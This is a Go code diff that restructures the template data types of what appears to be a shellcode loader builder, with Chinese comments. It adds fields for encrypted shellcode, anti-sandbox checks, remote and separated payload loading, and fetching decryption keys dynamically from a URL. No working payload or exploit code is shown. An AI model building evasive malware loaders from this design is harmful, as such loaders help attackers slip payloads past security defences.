@@ -8,47 +8,65 @@ type TmplOpts struct {
 }
 
 type Data struct {
-	KeyName     string      // key 变量名
-	KeyValue    string      // key 值
-	IvName      string      // iv  变量名
-	IvValue     string      // iv  值
-	CipherText  string      // 保存加密文本的变量名
-	PlainText   string      // 保存解密文本的变量名
-	Payload     string      // 加密 shellcode
-	Decrypt     string      // 解密方法
-	Loader      string      // loader
-	EncryptData string      // 加密后的Payload文件
-	SandBox     interface{} // 反沙箱模块
-	Local       interface{} // 本地加载模块
-	Remote      interface{} // 远程加载模块
-	Args        interface{} // 参数加载模块
-	Compressor  interface{} // 压缩算法模块
+	CipherText    string      // 保存加密文本的变量名
+	PlainText     string      // 保存解密文本的变量名
+	Payload       string      // 加密 shellcode
+	DecryptMethod string      // 解密方法
+	Loader        interface{} // loader
+	SandBox       interface{} // 反沙箱模块
+	Local         interface{} // 本地加载模块
+	Remote        interface{} // 远程加载模块
+	Args          interface{} // 参数加载模块
+	Compressor    interface{} // 压缩算法模块
+	Apart         interface{} // 分离加载模块
+	Dynamic       interface{} // 动态数据
+}
+
+type Loader struct {
+	Method string // loader
+	Hide   string // 隐藏方法
 }
 
 type SandBox struct {
 	Import  string   // 导入库
-	Methods []string // 反沙箱方法，可以一次渲染多个
+	Methods []string // 反沙箱方法, 批量渲染
 }
 
 type Compressor struct {
 	Import    string // 导入库
 	Algorithm string // 压缩算法
-	Ratio     int    // lzw 压缩率
+	Ratio     int    // lzw 压缩率, 一般为8
 }
 
-type Args struct {
-	ArgsName  string // 参数加载的变量名
-	ArgsValue string // 参数加载设置的密钥
+type Local struct {
+	KeyName  string // Key 变量名
+	KeyValue string // Key 值
+	IvName   string // Iv  变量名
+	IvValue  string // Iv  值
 }
 
 type Remote struct {
+	Import  string // 导入库
 	Url     string // 远程加载Url
 	UrlName string // 远程加载变量名
 	Method  string // 请求方法
 }
 
-type Load struct {
-	Remote string
-	Local  string
-	Apart  string
+type Dynamic struct {
+	Import        string // 导入库
+	DynamicUrl    string // 动态获取 Key
+	DynamicMethod string // 动态函数
+	KeyName       string // Key 变量名
+	DynamicKey    string // 动态获取 Key
+	KeyStart      int    // Key 动态区间
+	KeyEnd        int    // Key 动态区间
+	IVName        string // IV 变量名
+	DynamicIV     string // 动态获取 IV
+	IVStart       int    // IV 动态区间
+	IVEnd         int    // IV 动态区间
+}
+
+type Args struct {
+	Import  string // 导入库
+	ArgsKey string // 参数加载设置的密钥
 }
